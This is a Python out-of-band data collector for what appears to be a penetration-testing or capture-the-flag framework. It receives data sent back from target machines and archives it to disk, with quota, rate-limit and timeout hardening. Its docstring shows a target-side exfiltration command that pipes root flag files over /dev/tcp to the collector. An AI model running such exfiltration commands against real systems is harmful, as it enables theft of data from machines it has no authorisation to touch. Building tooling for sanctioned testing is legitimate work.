#!/usr/bin/env python3
"""OOB 侧信道收集器:监听 19999,收到的数据按时间+来源落盘。
靶机侧用法: cat /root/flag* > /dev/tcp/<runtime-host>/19999
产物: /var/lib/spectre/oob/<ts>-<ip>.txt(只读归档,审计可查)

F12 加固(2026-09-27 QA 循环6,公网 IP 已实际触达):
- 目录总量配额 512MB(超限丢弃+告警)——97% 磁盘下 ~8 万连接即填满 /
- 每 IP 频率限制 10 连接/分钟(滑动窗口)——防刷
- 单连接 64KB 不变;0.0.0.0 绑定不变(靶机回连必需)
"""
import socket, sys, threading, time, os, datetime
from collections import defaultdict, deque
OUT = os.path.join(os.environ.get('SPECTRE_DATA_DIR', '/var/lib/spectre'), 'oob')
if not os.environ.get('SPECTRE_DATA_DIR'):
    # R32D41-N1/CS15-3 → R32D76-N7: 与 fetch 家族同硬拒——此前仅 [warn]
    # 后仍在生产根 makedirs(新用户第一发探测即落 /var/lib/spectre)。
    # systemd 单元总带该 env(生产不受影响); 手跑必须显式指定数据根。
    print('[fatal] SPECTRE_DATA_DIR 未设置——拒绝回退生产根 /var/lib/spectre'
          '(oob-collector 由 systemd 拉起时总带该 env; 手跑请显式指定)',
          file=sys.stderr, flush=True)
    sys.exit(1)
QUOTA_BYTES = 512 * 1024 * 1024      # 目录总量上限
RATE_PER_IP = 10                     # 每 IP 每分钟连接数
RATE_WINDOW = 60.0

os.makedirs(OUT, exist_ok=True)

def dir_bytes():
    total = 0
    for fn in os.listdir(OUT):
        try:
            total += os.path.getsize(os.path.join(OUT, fn))
        except OSError:
            pass
    return total

_rate = defaultdict(deque)           # ip -> deque[timestamps]
_rate_lock = threading.Lock()
_quota_lock = threading.Lock()      # R17-F4/CS20-1: 配额 check-写原子化(锁含落盘)

def rate_ok(ip):
    now = time.monotonic()
    with _rate_lock:
        q = _rate[ip]
        while q and now - q[0] > RATE_WINDOW:
            q.popleft()
        if len(q) >= RATE_PER_IP:
            return False
        q.append(now)
        if len(_rate) > 4096:        # 防内存膨胀:过期表瘦身
            for k in list(_rate.keys()):
                if not _rate[k] or now - _rate[k][-1] > RATE_WINDOW * 5:
                    _rate.pop(k, None)
        return True

def handle(c, addr):
    try:
        data = b''
        c.settimeout(10)
        # R17-F3: 总死线——单次 recv 超时挡不住 1B/9s 慢连接永久占用
        # 线程(永不满足 64KB/EOF 退出条件), FD/内存耗尽殃及合法回连。
        deadline = time.monotonic() + 60
        acked = False
        while len(data) < 65536 and time.monotonic() < deadline:
            chunk = c.recv(4096)
            if not chunk: break
            data += chunk
            # r35-OOB-ACK: 首个有效块即回写单行 ACK(不等收流结束——
            # 客户端等响应时收流不会终止)。裸 TCP 汇不回响应, 探针
            # 超时曾被误读为"监听器下线"(r35 对账#14 整类误读消解)。
            if not acked:
                acked = True
                try:
                    c.sendall(f'OK {datetime.datetime.now().isoformat(timespec="seconds")}\n'.encode())
                except Exception:
                    pass
    except Exception:
        pass
    finally:
        c.close()
    if not data:
        return
    # R17-F4/CS20-1: check-写 TOCTOU——锁必须包住检查到落盘全程。
    # 此前落盘三行在锁外(R17 注释即宣称'检查到落盘原子化', CS20 实
    # 锤注释与代码相反——并发线程同过检查后同写仍可超配额)。
    with _quota_lock:
        if dir_bytes() + len(data) > QUOTA_BYTES:
            print(f'[oob][QUOTA] 目录超限 {QUOTA_BYTES//(1024*1024)}MB,丢弃 {addr[0]} 的 {len(data)}B', flush=True)
            return
        ts = datetime.datetime.now().strftime('%Y%m%d-%H%M%S-%f')
        path = f'{OUT}/{ts}-{addr[0]}.txt'
        with open(path, 'ab') as f:
            f.write(data)
    print(f'[oob] {addr[0]} → {path} ({len(data)}B)', flush=True)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# R32D42-P3: 端口占用(OSError 98)此前裸栈——给一行可行动提示。
try:
    # R32D95-N3: 端口值守卫(此前 abc → int() 裸栈)。
    _p = os.environ.get('OOB_PORT', '19999')
    if not (_p.isascii() and _p.isdigit() and 0 < int(_p) < 65536):
        print(f'[oob] FATAL: OOB_PORT={_p!r} 须为 1-65535 整数', file=sys.stderr, flush=True)
        sys.exit(1)
    s.bind(('0.0.0.0', int(_p))); s.listen(16)
except OSError as e:
    print(f'[oob] 监听失败: {e}(端口被占? 换 OOB_PORT=<端口> 或停占用进程)', flush=True)
    sys.exit(1)
print(f'[oob] listening :{os.environ.get("OOB_PORT", "19999")} (quota={QUOTA_BYTES//(1024*1024)}MB, rate={RATE_PER_IP}/min/ip)', flush=True)
while True:
    c, addr = s.accept()
    if not rate_ok(addr[0]):
        c.close()
        print(f'[oob][RATE] {addr[0]} 超频,拒绝', flush=True)
        continue
    threading.Thread(target=handle, args=(c, addr), daemon=True).start()
